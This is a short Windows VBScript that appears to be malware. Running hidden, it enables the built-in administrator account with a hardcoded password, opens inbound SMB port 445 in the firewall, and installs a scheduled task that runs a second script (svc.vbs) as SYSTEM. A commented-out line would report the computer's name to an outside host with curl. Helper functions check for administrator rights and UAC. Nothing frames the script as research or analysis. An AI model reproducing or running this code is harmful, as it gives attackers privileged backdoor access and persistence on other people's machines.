On Error Resume Next
Set oShell = CreateObject ("WScript.Shell") 
windir = oShell.ExpandEnvironmentStrings( "%WINDIR%" )
strComputerName = oShell.ExpandEnvironmentStrings( "%COMPUTERNAME%" )

With oShell
  .Run "net user administrator /active:yes", 0, True
  .Run "net user administrator Qwerty12!", 0, True
  .Run "cmd /c NETSH advfirewall firewall add rule name=""445"" program=System profile=public,private,domain dir=in localport=445 protocol=tcp action=allow description=""445""", 0, True
  .Run "schtasks /stop /tn syssw", 0, True
  .Run "schtasks /delete /tn syssw /F", 0, True
  '.Run "schtasks /create /ru ""SYSTEM"" /sc MONTHLY /ST " & DateAdd("s", 30, Now) & " /tr """ & windir & "\svc.vbs"" /tn syssw /rl highest /F", 0, True
  
  .Run "schtasks /create /ru ""SYSTEM"" /sc MONTHLY  /tr """ & windir & "\hp\svc.vbs"" /tn syssw /rl highest /F", 0, True
  .Run "schtasks /run /tn syssw", 0, True
  
  'If UserPerms("Admin") Then
  ' Message = "Good to go"
  '.Run windir & "\file.pdf"
   '.Run "curl http://troglo.homepc.it/trade/alert.php?pc=mttool_" & strComputerName, 0, True
  'Else
  ' Message = "Non-Admin"
  'End If
End With

Function XmlTime(t)
    Dim cSecond, cMinute, CHour, cDay, cMonth, cYear
    Dim tTime, tDate

    cSecond = "0" & Second(t)
    cMinute = "0" & Minute(t)
    cHour = "0" & Hour(t)
    cDay = "0" & Day(t)
    cMonth = "0" & Month(t)
    cYear = Year(t)

    tTime = Right(cHour, 2) & ":" & Right(cMinute, 2) & _
        ":" & Right(cSecond, 2)
    tDate = cYear & "-" & Right(cMonth, 2) & "-" & Right(cDay, 2)
    XmlTime = tDate & "T" & tTime 
End Function
Function UserPerms (PermissionQuery)          
 UserPerms = False  ' False unless proven otherwise           
 Dim CheckFor, CmdToRun         

 Select Case Ucase(PermissionQuery)           
 'Setup aliases here           
 Case "ELEVATED"           
   CheckFor =  "S-1-16-12288"           
 Case "ADMIN"           
   CheckFor =  "S-1-5-32-544"           
 Case "ADMINISTRATOR"           
   CheckFor =  "S-1-5-32-544"           
 Case Else                  
   CheckFor = PermissionQuery                  
 End Select           

 CmdToRun = "%comspec% /c whoami /all | findstr /I /C:""" & CheckFor & """"  

 Dim oShell, returnValue        
 Set oShell = CreateObject("WScript.Shell")  
 returnValue = oShell.Run(CmdToRun, 0, true)     
 If returnValue = 0 Then UserPerms = True                   
End Function

Function UACTurnedOn ()
 On Error Resume Next

 Set oShell = CreateObject("WScript.Shell")
 If oShell.RegRead("HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA") = 0 Then
      UACTurnedOn = false
 Else
      UACTurnedOn = true
 End If
End Function